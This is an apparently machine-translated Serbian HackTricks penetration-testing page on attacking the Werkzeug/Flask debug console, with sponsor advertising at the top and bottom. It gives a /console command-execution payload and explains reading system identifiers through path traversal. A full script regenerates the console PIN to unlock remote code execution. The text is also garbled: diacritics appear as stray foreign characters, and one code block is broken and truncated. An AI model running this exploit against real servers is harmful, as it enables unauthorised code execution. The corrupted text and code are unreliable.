# Werkzeug / Flask Debug

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Trenutno dostupno pode코avanje za procenu ranjivosti i testiranje proboja**. Pokrenite kompletan pentest od bilo kog mesta sa 20+ alata i funkcija koje idu od rekonstrukcije do izve코tavanja. Mi ne zamenjujemo pentestere - mi razvijamo prilago캠ene alate, module za otkrivanje i eksploataciju kako bismo im vratili neko vreme da dublje kopaju, otvaraju ljuske i zabavljaju se.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Ako je debug aktivan, mo쬰te poku코ati da pristupite `/console` i steknete RCE.

```python
__import__('os').popen('whoami').read();
```

![](<../../.gitbook/assets/image (317).png>)

Tako캠e postoje razli캜iti eksploiti na internetu poput [ovog ](https://github.com/its-arun/Werkzeug-Debug-RCE)ili jedan u metasploit-u.

## Pin za코ti캖en - Traversiranje putanje

U nekim slu캜ajevima, **`/console`** endpoint 캖e biti za코ti캖en pinom. Ako imate **ranjivost traverziranja datoteka**, mo쬰te procuriti sve potrebne informacije za generisanje tog pina.

### Eksploatacija PIN-a Werkzeug konzole

Prisilite gre코ku u debagiranju aplikacije da biste videli ovo:

```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```

Poruka u vezi sa scenarijem "zaklju캜ane konzole" se pojavljuje prilikom poku코aja pristupa Werkzeug-ovom debug interfejsu, ukazuju캖i na potrebu za PIN-om kako bi se otklju캜ala konzola. Predlog je da se iskoristi PIN konzole analiziranjem algoritma generisanja PIN-a u Werkzeug-ovom debug inicijalizacijskom fajlu (`__init__.py`). Mekanizam generisanja PIN-a mo쬰 se prou캜iti iz [**Werkzeug izvornog koda na repozitorijumu**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), iako se preporu캜uje da se stvarni serverski kod nabavi putem ranjivosti prolaska kroz fajlove zbog mogu캖ih razlika u verzijama.

Za iskori코캖avanje PIN-a konzole, potrebna su dva skupa promenljivih, `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Odaje korisnika koji je pokrenuo Flask sesiju.
* **`modname`**: Obi캜no ozna캜en kao `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Generalno se re코ava u **Flask**.
* **`getattr(mod, '__file__', None)`**: Predstavlja puni put do `app.py` unutar Flask direktorijuma (npr. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Ako `app.py` nije primenljiv, **poku코ajte sa `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Dohvata MAC adresu trenutne ma코ine, sa `str(uuid.getnode())` prevodi je u decimalni format.
* Da biste **odredili MAC adresu servera**, morate identifikovati aktivni mre쬹i interfejs koji koristi aplikacija (npr. `ens3`). U slu캜aju neizvesnosti, **procuretajte `/proc/net/arp`** da biste prona코li ID ure캠aja, zatim **izdvojite MAC adresu** iz **`/sys/class/net/<device id>/address`**.
* Konverziju heksadecimalne MAC adrese u decimalni format mo쬰te izvr코iti na slede캖i na캜in:

```python
# Primer MAC adrese: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

* **`get_machine_id()`**: Spaja podatke iz `/etc/machine-id` ili `/proc/sys/kernel/random/boot_id` sa prvom linijom `/proc/self/cgroup` nakon poslednje kosine (`/`).

<details>

<summary>Kod za `get_machine_id()`</summary>

\`\`\`python def get\_machine\_id() -> t.Optional\[t.Union\[str, bytes]]: global \_machine\_id

if \_machine\_id is not None: return \_machine\_id

def \_generate() -> t.Optional\[t.Union\[str, bytes]]: linux = b""

## machine-id is stable across boots, boot\_id is not.

for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot\_id": try: with open(filename, "rb") as f: value = f.readline().strip() except OSError: continue

if value: linux += value break

## Containers share the same machine id, add some cgroup

## information. This is used outside containers too but should be

## relatively stable across boots.

try: with open("/proc/self/cgroup", "rb") as f: linux += f.readline().strip().rpartition(b"/")\[2] except OSError: pass

if linux: return linux

## On OS X, use ioreg to get the computer's serial number.

try:

````
</details>

Nakon prikupljanja svih potrebnih podataka, eksploatacijski skript mo쬰 biti izvr코en kako bi generisao Werkzeug konzolni PIN. Skript koristi sastavljene `probably_public_bits` i `private_bits` kako bi kreirao he코, koji zatim prolazi kroz dodatnu obradu kako bi se generisao kona캜ni PIN. U nastavku je Python kod za izvr코avanje ovog procesa:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
````

Ovaj skript generi코e PIN tako 코to he코ira konkatenirane bitove, dodaje specifi캜ne soli (`cookiesalt` i `pinsalt`), i formatira izlaz. Va쬹o je napomenuti da stvarne vrednosti za `probably_public_bits` i `private_bits` treba ta캜no dobiti sa ciljnog sistema kako bi generisani PIN odgovarao o캜ekivanom od strane Werkzeug konzole.

Ako koristite **staru verziju** Werkzuga, poku코ajte promeniti **algoritam he코iranja u md5** umesto sha1.

### Reference

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<img src="../../.gitbook/assets/image (2) (1) (1).png" alt="" data-size="original">

**Instantno dostupno pode코avanje za procenu ranjivosti i testiranje proboja**. Pokrenite kompletan pentest od bilo kog mesta sa 20+ alata i funkcija koje idu od rekonstrukcije do izve코tavanja. Ne zamenjujemo pentestere - razvijamo prilago캠ene alate, module za otkrivanje i eksploataciju kako bismo im vratili ne코to vremena da dublje kopaju, otvaraju 코koljke i zabavljaju se.

</details>
